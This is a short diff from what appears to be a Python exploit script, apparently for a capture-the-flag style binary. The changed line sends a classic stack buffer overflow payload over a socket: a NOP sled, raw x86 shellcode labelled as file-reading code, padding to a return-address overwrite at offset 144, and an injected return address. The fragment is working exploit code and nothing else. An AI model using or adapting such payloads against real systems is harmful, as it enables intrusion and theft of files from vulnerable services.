@@ -50,7 +50,7 @@ custom_shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6"
 ret_overwrite = 144
 
 #	       nopsled	read_file_code    padding     					   ret      padding
-s.sendline("\x90"*80 + test_code + "\x90"*(ret_overwrite - (80+45)) + stack + "\x90"*30)
+s.sendline("\x90"*80 + custom_shellcode + "\x90"*(ret_overwrite - (80+45)) + stack + "\x90"*30)
 
 print s.recv(timeout=5)
 
